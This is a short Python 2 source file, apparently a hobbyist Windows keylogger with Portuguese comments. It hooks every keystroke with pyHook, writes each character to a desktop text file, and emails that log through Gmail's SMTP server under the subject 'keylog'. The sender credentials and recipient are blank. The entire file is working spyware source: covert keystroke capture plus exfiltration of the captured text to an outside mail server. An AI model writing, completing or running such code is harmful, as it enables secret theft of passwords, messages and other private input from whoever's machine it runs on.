import pyHook, sys, pythoncom, logging
import getpass, smtplib, socket

def email_test():
    #connect to gmail server
    try:
        smtpserver = smtplib.SMTP('smtp.gmail.com', 587)
        smtpserver.ehlo()
        smtpserver.starttls()
        smtpserver.ehlo()
        
        #email and password, login in the account
        try:
            gmail_user = str("").strip() #gmail
            gmail_pwd = "".strip() #password
            smtpserver.login(gmail_user, gmail_pwd)
        except smtplib.SMTPException:
            smtpserver.close()
            sys.exit(1)

    except(socket.gaierror, socket.error, socket.herror, smtplib.SMTPException), e:
        sys.exit(1)
        
    #its the txt file that we want to send
    filetxt = 'C:\\Users\\Douglas\\Desktop\\texto.txt'
    fileopen = open(filetxt, 'rb')
    txt_content = fileopen.read()
    
    #gets the email that will recive the mail, subject, message and body
    to = str("").strip()#email
    sub = str("keylog").strip()
    bodymsg = str("Log: ")
    header = 'To: '+ to + '\n' + 'From:' + gmail_user + '\n' + 'Subject:' + sub + '\n'
    msg = header + '\n' + bodymsg + '\n' + txt_content + '\n'

    try:
        smtpserver.sendmail(gmail_user, to, msg)
    except smtplib.SMTPException:
        smtpserver.close()
        sys.exit(1)

    smtpserver.close()

def OnKeyboardEvent(event):
    file_log = "C:\\Users\Douglas\\Desktop\\texto.txt"
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii) #transforma o numero da tecla em letra
    logging.log(10, chr(event.Ascii))
    return True

email_test()
hooks_manager = pyHook.HookManager() 
hooks_manager.KeyDown = OnKeyboardEvent #fala oq fazer quando usuario aperta um botao
hooks_manager.HookKeyboard() #fala ao programa continuar olhando o teclado
pythoncom.PumpMessages()#mantem o programa rodando
